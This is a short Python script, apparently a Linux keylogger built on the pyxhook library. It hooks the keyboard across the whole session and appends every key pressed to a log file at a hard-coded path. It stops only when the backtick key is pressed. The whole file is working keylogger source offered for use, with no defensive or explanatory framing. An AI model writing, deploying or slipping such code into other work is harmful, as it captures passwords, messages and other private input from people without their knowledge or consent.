import pyxhook

keyfile='/home/pylay/[linux] keylogger/file.log'
#change this to your log file's path


def OnKeyPress(event):
  fob=open(keyfile,'a')
  fob.write(event.Key)
  fob.write('\n')

  if event.Ascii==96: #96 = ascii (`)
    fob.close()
    new_hook.cancel()


new_hook=pyxhook.HookManager()

new_hook.KeyDown=OnKeyPress

new_hook.HookKeyboard()

new_hook.start()
